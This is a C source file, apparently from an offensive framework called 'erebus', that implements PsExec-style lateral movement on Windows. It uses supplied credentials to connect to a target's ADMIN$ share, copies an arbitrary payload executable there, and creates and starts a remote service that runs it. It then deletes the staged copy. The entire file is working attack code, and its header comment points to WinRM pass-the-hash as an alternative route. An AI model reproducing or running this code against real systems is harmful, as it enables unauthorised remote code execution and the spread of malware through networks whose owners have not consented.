/*
 * PsExec-style lateral: stage payload to ADMIN$ and create/start remote service.
 * Auth: password via WNetAddConnection2. Hash-only: clear hard-fail (use WinRM PTH).
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winnetwk.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/lateral_impl.h"

#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "advapi32.lib")

static int utf8_to_wide(const char *s, wchar_t **out) {
    if (!s) { *out = NULL; return 1; }
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (n <= 0) return 0;
    *out = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    if (!*out) return 0;
    if (!MultiByteToWideChar(CP_UTF8, 0, s, -1, *out, n)) {
        free(*out); *out = NULL; return 0;
    }
    return 1;
}

int erebus_lateral_psexec(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
    *success = 0;
    output[0] = '\0';

    if (!cfg->username[0]) {
        snprintf(output, output_cap, "psexec requires username");
        return 1;
    }
    if (!cfg->password[0] && cfg->ntlm_hash[0]) {
        snprintf(output, output_cap,
            "psexec PTH/ntlm_hash not supported via WNet; use winrm with ntlm_hash or provide password");
        return 1;
    }
    if (!cfg->password[0]) {
        snprintf(output, output_cap, "psexec requires password (or use winrm ntlm_hash)");
        return 1;
    }
    if (!cfg->payload || cfg->payload_len == 0) {
        snprintf(output, output_cap, "psexec requires payload bytes (service binary)");
        return 1;
    }

    const char *svc_name = cfg->service_name[0] ? cfg->service_name : "ErebusSvc";
    char remote_share[512];
    snprintf(remote_share, sizeof(remote_share), "\\\\%s\\ADMIN$", cfg->target);

    char userbuf[512];
    if (cfg->domain[0])
        snprintf(userbuf, sizeof(userbuf), "%s\\%s", cfg->domain, cfg->username);
    else
        snprintf(userbuf, sizeof(userbuf), "%s", cfg->username);

    wchar_t *wshare = NULL, *wuser = NULL, *wpass = NULL;
    if (!utf8_to_wide(remote_share, &wshare) || !utf8_to_wide(userbuf, &wuser)
        || !utf8_to_wide(cfg->password, &wpass)) {
        snprintf(output, output_cap, "utf16 convert failed");
        free(wshare); free(wuser); free(wpass);
        return 1;
    }

    NETRESOURCEW nr;
    memset(&nr, 0, sizeof(nr));
    nr.dwType = RESOURCETYPE_DISK;
    nr.lpRemoteName = wshare;

    DWORD wnet = WNetAddConnection2W(&nr, wpass, wuser, 0);
    if (wnet != NO_ERROR && wnet != ERROR_SESSION_CREDENTIAL_CONFLICT
        && wnet != ERROR_ALREADY_ASSIGNED) {
        snprintf(output, output_cap, "WNetAddConnection2 ADMIN$ failed: %lu", (unsigned long)wnet);
        free(wshare); free(wuser); free(wpass);
        return 1;
    }

    char remote_file[768];
    snprintf(remote_file, sizeof(remote_file), "\\\\%s\\ADMIN$\\%s.exe", cfg->target, svc_name);

    HANDLE hf = CreateFileA(remote_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        snprintf(output, output_cap, "create ADMIN$\\%s.exe failed: %lu",
            svc_name, (unsigned long)GetLastError());
        WNetCancelConnection2W(wshare, 0, TRUE);
        free(wshare); free(wuser); free(wpass);
        return 1;
    }
    DWORD written = 0;
    BOOL wok = WriteFile(hf, cfg->payload, (DWORD)cfg->payload_len, &written, NULL);
    CloseHandle(hf);
    if (!wok || written != (DWORD)cfg->payload_len) {
        snprintf(output, output_cap, "write payload failed (%lu bytes)", (unsigned long)written);
        DeleteFileA(remote_file);
        WNetCancelConnection2W(wshare, 0, TRUE);
        free(wshare); free(wuser); free(wpass);
        return 1;
    }

    char bin_path[512];
    snprintf(bin_path, sizeof(bin_path), "C:\\Windows\\%s.exe", svc_name);

    wchar_t *wtarget = NULL, *wsvc = NULL, *wbin = NULL;
    utf8_to_wide(cfg->target, &wtarget);
    utf8_to_wide(svc_name, &wsvc);
    utf8_to_wide(bin_path, &wbin);

    char scm_path[512];
    snprintf(scm_path, sizeof(scm_path), "\\\\%s", cfg->target);
    wchar_t *wscm = NULL;
    utf8_to_wide(scm_path, &wscm);

    SC_HANDLE hscm = OpenSCManagerW(wscm, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!hscm) {
        /* try with NULL machine after share connect */
        hscm = OpenSCManagerW(wtarget, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    }
    if (!hscm) {
        snprintf(output, output_cap,
            "payload staged to ADMIN$\\%s.exe but OpenSCManager failed: %lu",
            svc_name, (unsigned long)GetLastError());
        DeleteFileA(remote_file);
        WNetCancelConnection2W(wshare, 0, TRUE);
        free(wshare); free(wuser); free(wpass);
        free(wtarget); free(wsvc); free(wbin); free(wscm);
        return 1;
    }

    SC_HANDLE hsvc = CreateServiceW(hscm, wsvc, wsvc, SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        wbin, NULL, NULL, NULL, NULL, NULL);
    if (!hsvc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hsvc = OpenServiceW(hscm, wsvc, SERVICE_ALL_ACCESS);
        }
        if (!hsvc) {
            snprintf(output, output_cap,
                "payload staged but CreateService failed: %lu", (unsigned long)err);
            CloseServiceHandle(hscm);
            DeleteFileA(remote_file);
            WNetCancelConnection2W(wshare, 0, TRUE);
            free(wshare); free(wuser); free(wpass);
            free(wtarget); free(wsvc); free(wbin); free(wscm);
            return 1;
        }
        /* update binary path */
        ChangeServiceConfigW(hsvc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
            wbin, NULL, NULL, NULL, NULL, NULL, NULL);
    }

    if (!StartServiceW(hsvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            snprintf(output, output_cap,
                "payload staged, service created but StartService failed: %lu (cleanup attempted)",
                (unsigned long)err);
            SERVICE_STATUS ss;
            ControlService(hsvc, SERVICE_CONTROL_STOP, &ss);
            DeleteService(hsvc);
            CloseServiceHandle(hsvc);
            CloseServiceHandle(hscm);
            DeleteFileA(remote_file);
            WNetCancelConnection2W(wshare, 0, TRUE);
            free(wshare); free(wuser); free(wpass);
            free(wtarget); free(wsvc); free(wbin); free(wscm);
            return 1;
        }
    }

    CloseServiceHandle(hsvc);
    CloseServiceHandle(hscm);

    /* Best-effort remove staged name from share (service may lock C:\Windows copy). */
    DeleteFileA(remote_file);
    WNetCancelConnection2W(wshare, 0, TRUE);

    snprintf(output, output_cap,
        "payload staged and service %s started on %s (binary: %s)",
        svc_name, cfg->target, bin_path);
    *success = 1;

    free(wshare); free(wuser); free(wpass);
    free(wtarget); free(wsvc); free(wbin); free(wscm);
    return 1;
}
